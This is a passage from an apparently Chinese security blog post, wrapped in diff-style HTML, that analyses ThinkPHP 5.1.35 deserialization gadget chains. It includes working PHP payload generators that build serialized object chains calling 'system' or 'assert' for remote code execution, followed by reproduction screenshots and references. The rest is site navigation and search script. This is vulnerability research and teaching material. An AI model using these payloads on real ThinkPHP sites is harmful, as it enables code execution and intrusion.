   <span class="keyword">protected</span> $filter=<span class="string">"system"</span>;</span><br><span class="line">    <span class="keyword">protected</span> $hook=[];</span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span><br><span class="line">		<span class="keyword">$this</span>-&gt;hook=<span class="keyword">array</span>(</span><br><span class="line">            <span class="string">"visible"</span>=&gt;[<span class="keyword">$this</span>,<span class="string">"isAjax"</span>],</span><br><span class="line">        );</span><br><span class="line">		<span class="keyword">$this</span>-&gt;config=[<span class="string">"var_ajax"</span>=&gt;<span class="string">""</span>];<span class="comment">#不能给值，否则input()中途退出</span></span><br><span class="line">		<span class="keyword">$this</span>-&gt;filter= <span class="string">"system"</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">Model</span></span>&#123;</span><br><span class="line">	<span class="keyword">protected</span> $append = [];</span><br><span class="line">	<span class="keyword">private</span> $data = [];</span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span><br><span class="line">		<span class="keyword">$this</span>-&gt;append=[<span class="string">"test"</span>=&gt;[<span class="string">""</span>]];</span><br><span class="line">		<span class="keyword">$this</span>-&gt;data=[<span class="string">"test"</span>=&gt;<span class="keyword">new</span> Request()];</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>\<span class="title">model</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">Model</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Pivot</span> <span class="keyword">extends</span> <span class="title">Model</span></span>&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">process</span>\<span class="title">pipes</span>\<span class="title">Windows</span>;</span><br><span class="line"><span class="keyword">echo</span> base64_encode(serialize(<span class="keyword">new</span> Windows()));</span><br></pre></td></tr></table></figure>
+
+<p>需要说明的是，执行的命令需要手动GET提交，参数任意。因为序列化我们实例化的Request类是新类，仅有部分属性，因此需要手动GET提交参数供它接收，最终会赋值给$this-&gt;param。</p>
+<p>见<code>thinkphp/library/think/Request.php</code>：</p>
+<p>可能会认为$this-&gt;param可控，但测试发现即使序列化赋值，最终也接收不到。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">param</span><span class="params">($name = <span class="string">''</span>, $default = null, $filter = <span class="string">''</span>)</span></span>&#123;</span><br><span class="line">    ...</span><br><span class="line">    <span class="keyword">$this</span>-&gt;param = array_merge(<span class="keyword">$this</span>-&gt;param, <span class="keyword">$this</span>-&gt;get(<span class="keyword">false</span>), $vars, <span class="keyword">$this</span>-&gt;route(<span class="keyword">false</span>));</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="POC2"><a href="#POC2" class="headerlink" title="POC2"></a>POC2</h3><p>在上述<code>thinkphp/library/think/model/concern/Attribute.php</code> <strong>getAttr()</strong>中，红框处均可控</p>
+<img src="//songxpu.github.io/2020/01/20/代码审计/ThinkPHP/ThinkPHP5.1.35反序列化链分析/9.jpg">
+
+<p>payload：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>\<span class="title">process</span>\<span class="title">pipes</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">model</span>\<span class="title">Pivot</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Pipes</span></span>&#123;&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Windows</span> <span class="keyword">extends</span> <span class="title">Pipes</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">	<span class="keyword">private</span> $files = [];</span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span><br><span class="line">		<span class="keyword">$this</span>-&gt;files=[<span class="keyword">new</span> Pivot()];<span class="comment">#用于触发__toString()</span></span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>;</span><br><span class="line"><span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">Model</span></span>&#123;</span><br><span class="line">	<span class="keyword">protected</span> $append = [];</span><br><span class="line">	<span class="keyword">private</span> $data = [];</span><br><span class="line">	<span class="keyword">private</span> $withAttr = [];</span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span><br><span class="line">		<span class="keyword">$this</span>-&gt;append=[<span class="string">"test"</span>=&gt;[<span class="string">""</span>]];</span><br><span class="line">		<span class="keyword">$this</span>-&gt;data=[<span class="string">"test"</span>=&gt;<span class="string">"phpinfo()"</span>];</span><br><span class="line">		<span class="keyword">$this</span>-&gt;withAttr=[<span class="string">"test"</span>=&gt;<span class="string">"assert"</span>];</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>\<span class="title">model</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">Model</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Pivot</span> <span class="keyword">extends</span> <span class="title">Model</span></span>&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">process</span>\<span class="title">pipes</span>\<span class="title">Windows</span>;</span><br><span class="line"><span class="keyword">echo</span> base64_encode(serialize(<span class="keyword">new</span> Windows()));</span><br></pre></td></tr></table></figure>
+
+<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><h3 id="POC1-1"><a href="#POC1-1" class="headerlink" title="POC1"></a>POC1</h3><img src="//songxpu.github.io/2020/01/20/代码审计/ThinkPHP/ThinkPHP5.1.35反序列化链分析/8.jpg">
+
+<h3 id="POC2-1"><a href="#POC2-1" class="headerlink" title="POC2"></a>POC2</h3><img src="//songxpu.github.io/2020/01/20/代码审计/ThinkPHP/ThinkPHP5.1.35反序列化链分析/10.jpg">
+
+<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><ol>
+<li>宸哥笔记</li>
+<li><a href="https://paper.seebug.org/1040/" target="_blank" rel="noopener">https://paper.seebug.org/1040/</a></li>
+<li><a href="https://www.jianshu.com/p/fc053b2d7fd1" target="_blank" rel="noopener">https://www.jianshu.com/p/fc053b2d7fd1</a></li>
+</ol>
+
+      
+    </div>
+
+    
+
+    
+    
+    
+
+    
+
+    
+      
+    
+    
+
+    
+
+    <footer class="post-footer">
+      
+        
+          
+        
+        <div class="post-tags">
+          
+            <a href="/tags/web安全/" rel="tag"># web安全</a>
+          
+            <a href="/tags/代码审计/" rel="tag"># 代码审计</a>
+          
+            <a href="/tags/ThinkPHP/" rel="tag"># ThinkPHP</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2020/01/20/代码审计/ThinkPHP/ThinkPHP5.0.24反序列化链分析/" rel="next" title="ThinkPHP5.0.24反序列化链(任意文件写入)分析">
+                <i class="fa fa-chevron-left"></i> ThinkPHP5.0.24反序列化链(任意文件写入)分析
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2020/01/20/代码审计/ThinkPHP/ThinkPHP6.0.2反序列化链分析/" rel="prev" title="ThinkPHP6.0 RCE反序列化链分析">
+                ThinkPHP6.0 RCE反序列化链分析 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+  </div>
+
+
+          </div>
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name">Azeroth</p>
+              <div class="site-description motion-element" itemprop="description"></div>
+          </div>
+
+          
+            <nav class="site-state motion-element">
+              
+                <div class="site-state-item site-state-posts">
+                
+                  <a href="/archives/">
+                
+                    <span class="site-state-item-count">32</span>
+                    <span class="site-state-item-name">日志</span>
+                  </a>
+                </div>
+              
+
+              
+                
+                
+                <div class="site-state-item site-state-categories">
+                  
+                    
+                      <a href="/categories/">
+                    
+                  
+                    
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                    <span class="site-state-item-count">5</span>
+                    <span class="site-state-item-name">分类</span>
+                  </a>
+                </div>
+              
+
+              
+                
+                
+                <div class="site-state-item site-state-tags">
+                  
+                    
+                      <a href="/tags/">
+                    
+                  
+                    
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                    <span class="site-state-item-count">18</span>
+                    <span class="site-state-item-name">标签</span>
+                  </a>
+                </div>
+              
+            </nav>
+          
+
+          
+
+          
+
+          
+
+          
+
+          
+          
+
+          
+            
+          
+          
+
+        </div>
+      </div>
+
+      
+      <!--noindex-->
+        <div class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+            
+            
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#环境搭建"><span class="nav-number">1.</span> <span class="nav-text">环境搭建</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#漏洞挖掘"><span class="nav-number">2.</span> <span class="nav-text">漏洞挖掘</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#POC1"><span class="nav-number">2.1.</span> <span class="nav-text">POC1</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#POC2"><span class="nav-number">2.2.</span> <span class="nav-text">POC2</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#漏洞复现"><span class="nav-number">3.</span> <span class="nav-text">漏洞复现</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#POC1-1"><span class="nav-number">3.1.</span> <span class="nav-text">POC1</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#POC2-1"><span class="nav-number">3.2.</span> <span class="nav-text">POC2</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#参考资料"><span class="nav-number">4.</span> <span class="nav-text">参考资料</span></a></li></ol></div>
+            
+
+          </div>
+        </div>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+  
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2020</span>
+  <span class="with-love" id="animate">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Azeroth</span>
+
+  
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-area-chart"></i>
+    </span>
+    
+      <span class="post-meta-item-text">站点总字数：</span>
+    
+    <span title="站点总字数">160k</span>
+  
+
+  
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+    
+      <span class="post-meta-item-text">站点阅读时长 &asymp;</span>
+    
+    <span title="站点阅读时长">2:26</span>
+  
+</div>
+
+
+  <div class="powered-by">由 <a href="https://hexo.io" class="theme-link" rel="noopener" target="_blank">Hexo</a> 强力驱动 v3.8.0</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 – <a href="https://theme-next.org" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> v7.1.2</div>
+
+
+
+<span id="busuanzi_container_site_uv">
+  本站访问次数：<span class="busuanzi-value" id="busuanzi_value_site_pv"></span>
+</span>
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+  
+
+  
+
+  
+</div>
+
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+    
+
+    
+  </div>
+
+  
+
+<script>
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  <script src="/lib/jquery/index.js?v=2.1.3"></script>
+
+  
+  <script src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+
+  
+  <script src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+
+
+  
+
+
+  <script src="/js/utils.js?v=7.1.2"></script>
+
+  <script src="/js/motion.js?v=7.1.2"></script>
+
+
+
+  
+  
+
+
+  <script src="/js/affix.js?v=7.1.2"></script>
+
+  <script src="/js/schemes/pisces.js?v=7.1.2"></script>
+
+
+
+
+  
+  <script src="/js/scrollspy.js?v=7.1.2"></script>
+<script src="/js/post-details.js?v=7.1.2"></script>
+
+
+
+  
+
+
+  <script src="/js/next-boot.js?v=7.1.2"></script>
+
+
+  
+
+  
+
+  
+
+  
+
+
+  
+
+
+  
+  <script>
+    // Popup Window;
+    var isfetched = false;
+    var isXml = true;
+    // Search DB path;
+    var search_path = "search.xml";
+    if (search_path.length === 0) {
+      search_path = "search.xml";
+    } else if (/json$/i.test(search_path)) {
+      isXml = false;
+    }
+    var path = "/" + search_path;
+    // monitor main search box;
+
+    var onPopupClose = function (e) {
+      $('.popup').hide();
+      $('#local-search-input').val('');
+      $('.search-result-list').remove();
+      $('#no-result').remove();
+      $(".local-search-pop-overlay").remove();
+      $('body').css('overflow', '');
+    }
+
+    function proceedsearch() {
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
+        .css('overflow', 'hidden');
+      $('.search-popup-overlay').click(onPopupClose);
+      $('.popup').toggle();
+      var $localSearchInput = $('#local-search-input');
+      $localSearchInput.attr("autocapitalize", "none");
+      $localSearchInput.attr("autocorrect", "off");
+      $localSearchInput.focus();
+    }
+
+    // search function;
+    var searchFunc = function(path, search_id, content_id) {
+      'use strict';
+
+      // start loading animation
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
+          '<div id="search-loading-icon">' +
+          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
+          '</div>' +
+          '</div>')
+        .css('overflow', 'hidden');
+      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');
+
+      
+
+      $.ajax({
+        url: path,
+        dataType: isXml ? "xml" : "json",
+        async: true,
+        success: function(res) {
+          // get the contents from search data
+          isfetched = true;
+          $('.popup').detach().appendTo('.header-inner');
+          var datas = isXml ? $("entry", res).map(function() {
+            return {
+              title: $("title", this).text(),
+              content: $("content",this).text(),
+              url: $("url" , this).text()
+            };
+          }).get() : res;
+          var input = document.getElementById(search_id);
+          var resultContent = document.getElementById(content_id);
+          var inputEventFunction = function() {
+            var searchText = input.value.trim().toLowerCase();
+            var keywords = searchText.split(/[\s\-]+/);
+            if (keywords.length > 1) {
+              keywords.push(searchText);
+            }
+            var resultItems = [];
+            if (searchText.length > 0) {
+              // perform local searching
+              datas.forEach(function(data) {
+                var isMatch = false;
+                var hitCount = 0;
+                var searchTextCount = 0;
+                var title = data.title.trim();
+                var titleInLowerCase = title.toLowerCase();
+                var content = data.content.trim().replace(/<[^>]+>/g,"");
+                
+                var contentInLowerCase = content.toLowerCase();
+                var articleUrl = decodeURIComponent(data.url).replace(/\/{2,}/g, '/');
+                var indexOfTitle = [];
+                var indexOfContent = [];
+                // only match articles with not empty titles
+                if(title != '') {
+                  keywords.forEach(function(keyword) {
+                    function getIndexByWord(word, text, caseSensitive) {
+                      var wordLen = word.length;
+                      if (wordLen === 0) {
+                        return [];
+                      }
+                      var startPosition = 0, position = [], index = [];
+                      if (!caseSensitive) {
+                        text = text.toLowerCase();
+                        word = word.toLowerCase();
+                      }
+                      while ((position = text.indexOf(word, startPosition)) > -1) {
+                        index.push({position: position, word: word});
+                        startPosition = position + wordLen;
+                      }
+                      return index;
+                    }
+
+                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
+                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
+                  });
+                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
+                    isMatch = true;
+                    hitCount = indexOfTitle.length + indexOfContent.length;
+                  }
+                }
+
+                // show search results
+
+                if (isMatch) {
+                  // sort index by position of keyword
+
+                  [indexOfTitle, indexOfContent].forEach(function (index) {
+                    index.sort(function (itemLeft, itemRight) {
+                      if (itemRight.position !== itemLeft.position) {
+                        return itemRight.position - itemLeft.position;
+                      } else {
+                        return itemLeft.word.length - itemRight.word.length;
+                      }
+                    });
+                  });
+
+                  // merge hits into slices
+
+                  function mergeIntoSlice(text, start, end, index) {
+                    var item = index[index.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    var hits = [];
+                    var searchTextCountInSlice = 0;
+                    while (position + word.length <= end && index.length != 0) {
+                      if (word === searchText) {
+                        searchTextCountInSlice++;
+                      }
+                      hits.push({position: position, length: word.length});
+                      var wordEnd = position + word.length;
+
+                      // move to next position of hit
+
+                      index.pop();
+                      while (index.length != 0) {
+                        item = index[index.length - 1];
+                        position = item.position;
+                        word = item.word;
+                        if (wordEnd > position) {
+                          index.pop();
+                        } else {
+                          break;
+                        }
+                      }
+                    }
+                    searchTextCount += searchTextCountInSlice;
+                    return {
+                      hits: hits,
+                      start: start,
+                      end: end,
+                      searchTextCount: searchTextCountInSlice
+                    };
+                  }
+
+                  var slicesOfTitle = [];
+                  if (indexOfTitle.length != 0) {
+                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
+                  }
+
+                  var slicesOfContent = [];
+                  while (indexOfContent.length != 0) {
+                    var item = indexOfContent[indexOfContent.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    // cut out 100 characters
+                    var start = position - 20;
+                    var end = position + 80;
+                    if(start < 0){
+                      start = 0;
+                    }
+                    if (end < position + word.length) {
+                      end = position + word.length;
+                    }
+                    if(end > content.length){
+                      end = content.length;
+                    }
+                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
+                  }
+
+                  // sort slices in content by search text's count and hits' count
+
+                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
+                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
+                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
+                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
+                      return sliceRight.hits.length - sliceLeft.hits.length;
+                    } else {
+                      return sliceLeft.start - sliceRight.start;
+                    }
+                  });
+
+                  // select top N slices in content
+
+                  var upperBound = parseInt('1');
+                  if (upperBound >= 0) {
+                    slicesOfContent = slicesOfContent.slice(0, upperBound);
+                  }
+
+                  // highlight title and content
+
+                  function highlightKeyword(text, slice) {
+                    var result = '';
+                    var prevEnd = slice.start;
+                    slice.hits.forEach(function (hit) {
+                      result += text.substring(prevEnd, hit.position);
+                      var end = hit.position + hit.length;
+                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
+                      prevEnd = end;
+                    });
+                    result += text.substring(prevEnd, slice.end);
+                    return result;
+                  }
+
+                  var resultItem = '';
+
+                  if (slicesOfTitle.length != 0) {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
+                  } else {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
+                  }
+
+                  slicesOfContent.forEach(function (slice) {
+                    resultItem += "<a href='" + articleUrl + "'>" +
+                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
+                      "...</p>" + "</a>";
+                  });
+
+                  resultItem += "</li>";
+                  resultItems.push({
+                    item: resultItem,
+                    searchTextCount: searchTextCount,
+                    hitCount: hitCount,
+                    id: resultItems.length
+                  });
+                }
+              })
+            };
+            if (keywords.length === 1 && keywords[0] === "") {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x"></i></div>'
+            } else if (resultItems.length === 0) {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x"></i></div>'
+            } else {
+              resultItems.sort(function (resultLeft, resultRight) {
+                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
+                  return resultRight.searchTextCount - resultLeft.searchTextCount;
+                } else if (resultLeft.hitCount !== resultRight.hitCount) {
+                  return resultRight.hitCount - resultLeft.hitCount;
+                } else {
+                  return resultRight.id - resultLeft.id;
+                }
+              });
+              var searchResultList = '<ul class=\"search-result-list\">';
+              resultItems.forEach(function (result) {
+                searchResultList += result.item;
+              })
+              searchResultList += "</ul>";
+              resultContent.innerHTML = searchResultList;
+            }
+          }
+
+          if ('auto' === 'auto') {
+            input.addEventListener('input', inputEventFunction);
+          } else {
+            $('.search-icon').click(inputEventFunction);
+            input.addEventListener('keypress', function (event) {
+              if (event.keyCode === 13) {
+                inputEventFunction();
+              }
+            });
+          }
+
+          // remove loading animation
+          $(".local-search-pop-overlay").remove();
+          $('body').css('overflow', '');
+
+          proceedsearch();
+        }
+      });
+    }
+
+    // handle and trigger popup window;
+    $('.popup-trigger').click(function(e) {
+      e.stopPropagation();
+      if (isfetched === false) {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      } else {
+        proceedsearch();
+      };
+    });
+
+    $('.popup-btn-close').click(onPopupClose);
+    $('.popup').click(function(e){
+      e.stopPropagation();
+    });
+    $(document).on('keyup', function (event) {
+      var shouldDismissSearchPopup = event.which === 27 &&
+        $('.search-popup').is(':visible');
+      if (shouldDismissSearchPopup) {
+        onPopupClose();
+      }
+    });
+  </script>
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
